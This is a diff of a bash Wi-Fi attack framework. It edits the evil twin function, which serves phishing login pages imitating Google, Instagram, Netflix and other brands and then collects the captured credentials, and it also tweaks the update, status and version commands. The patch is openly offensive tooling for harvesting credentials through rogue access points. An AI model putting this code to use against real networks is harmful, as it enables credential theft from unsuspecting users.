@@ -370,7 +370,7 @@ function chipsets_panel(){
 # Check the interface mode
 function check_interface_mode(){
 	if [ "$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')" == "Arch" ]; then
-		iwconfig ${netCard} | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=":" | sed -e 's/\(.*\)/\L\1/' 2>/dev/null
+		iwconfig ${netCard} 2>/dev/null | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=":" | sed -e 's/\(.*\)/\L\1/' 2>/dev/null
 	else
 		iw dev ${netCard} info 2>/dev/null | grep 'type' | awk '{print $2}'
 	fi
@@ -1525,7 +1525,8 @@ function evilTwin(){
 	iptables --append FORWARD --in-interface ${evilCard} -j ACCEPT
 	echo 1 > /proc/sys/net/ipv4/ip_forward
 
-	echo -e "\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Templates: google, instagram, facebook, twitter, starbucks, linkedin, yahoo, discord, netflix, spotify, tiktok, dropbox, snapchat, optimum${endColour}"
+	templates=$(ls /opt/wef/main/templates | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' 2>/dev/null)
+	echo -e "\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Templates: ${templates}${endColour}"
 	sleep 0.1
 	echo -e "${blueColour}You can use a custom template by adding the content to /opt/wef/main/templates/template-name/${endColour}"
 	sleep 0.1
@@ -1555,7 +1556,7 @@ function evilTwin(){
 
 		if [ "$template_name" == "starbucks" ] || [ "$template_name" == "google" ] || [ "$template_name" == "facebook" ] || [ "$template_name" == "twitter" ] || [ "$template_name" == "yahoo" ] || [ "$template_name" == "optimum" ]; then
 			creds_content=$(cat /opt/wef/main/templates/$template_name/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
-		elif [ "$template_name" == "tiktok" ] || [ "$template_name" == "spotify" ] || [ "$template_name" == "netflix" ] || [ "$template_name" == "microsoft" ] || [ "$template_name" == "linkedin" ] || [ "$template_name" == "dropbox" ] || [ "$template_name" == "discord" ] || [ "$template_name" == "instagram" ]; then
+		elif [ "$template_name" == "spotify" ] || [ "$template_name" == "netflix" ] || [ "$template_name" == "microsoft" ] || [ "$template_name" == "linkedin" ] || [ "$template_name" == "dropbox" ] || [ "$template_name" == "instagram" ]; then
 			creds_content=$(cat /opt/wef/main/templates/${template_name}/usernames.txt 2>/dev/null)
 		else
 			creds_content=$(cat /opt/wef/main/templates/${template_name}/credentials.txt 2>/dev/null)
@@ -1699,25 +1700,25 @@ function checkCreds(){
 		echo -e "${blueColour}$twitter${endColour}"
 	fi
 
-	if [ "${linkedin}" ]; then
-		creds_counter="1"
-		echo -e "\n${yellowColour}Linkedin${endColour}"
-		echo -e "${yellowColour}--------\n${endColour}"
-		echo -e "${blueColour}$linkedin${endColour}"
-	fi
-
 	if [ "${insta}" ]; then
 		creds_counter="1"
 		echo -e "\n${yellowColour}Instagram${endColour}"
 		echo -e "${yellowColour}---------\n${endColour}"
-		echo -e "${blueColour}$insta${endColour}"
+		echo -e "${blueColour}${insta}${endColour}"
 	fi
 
 	if [ "${spotify}" ]; then
 		creds_counter="1"
 		echo -e "\n${yellowColour}Spotify${endColour}"
 		echo -e "${yellowColour}-------\n${endColour}"
-		echo -e "${blueColour}$spotify${endColour}"
+		echo -e "${blueColour}${spotify}${endColour}"
+	fi
+
+	if [ "${link}" ]; then
+		creds_counter="1"
+		echo -e "\n${yellowColour}Linkedin${endColour}"
+		echo -e "${yellowColour}--------\n${endColour}"
+		echo -e "${blueColour}${link}${endColour}"
 	fi
 
 	if [ "${microsoft}" ]; then
@@ -2440,7 +2441,7 @@ if [ "$(id -u)" == "0" ]; then
 				echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Auto credentials deletion disabled${endColour}"
 			fi
 
-			if [ "$option" == "info" ]; then
+			if [ "$option" == "info" ] || [ "$option" == "status" ]; then
 				correct_counter="3"
 				sleep 0.15
 				active_card
@@ -2480,12 +2481,10 @@ if [ "$(id -u)" == "0" ]; then
 				echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Checking the latest version"; sleep 0.3; echo -ne "."; sleep 0.3; echo -ne "."; sleep 0.3; echo -ne ".${endColour}"
 				sleep 0.2
 				if [ "$(curl -s -X GET 'https://raw.githubusercontent.com/D3Ext/WEF/main/images/version.txt')" != "${program_version}" ]; then
-					echo -ne "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] New version found. Do you want to update WEF? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]${endColour}" && read update_option
+					echo -ne "\n\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] New version found. Do you want to update WEF? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read update_option
 					if [ "${update_option}" == "y" ] || [ "${update_option}" == "yes" ]; then
-						wget "https://raw.githubusercontent.com/D3Ext/WEF/main/images/update.sh" &>/dev/null
-						bash update.sh
-						rm update.sh 2>/dev/null
-						echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Latest version installed successfully${endColour}"
+						bash /opt/wef/update.sh &>/dev/null
+						echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Update completed successfully${endColour}"
 					fi
 				else
 					echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] This is the latest version${endColour}"
@@ -2525,6 +2524,12 @@ if [ "$(id -u)" == "0" ]; then
 				checkCreds
 			fi
 
+			if [ "$option" == "banner" ] | [ "$option" == "banners" ]; then
+				correct_counter="3"
+				echo
+				all_banners
+			fi
+
 			if [ "$(echo $option | awk '{print $1}')" == "gps" ] && [ "$(echo $option | awk '{print $2}')" ]; then
 				correct_counter="3"
 				sleep 0.1
@@ -2547,7 +2552,7 @@ if [ "$(id -u)" == "0" ]; then
 
 			if [ "$option" == "version" ]; then
 				correct_counter="3"
-				echo -e "\nwef v1.0.0 for linux (https://github.com/D3Ext/WEF)"
+				echo -e "\nwef v1.0 for linux (https://github.com/D3Ext/WEF)"
 				echo -e "Created by D3Ext <d3ext@protonmail.com>\n"
 			fi
 
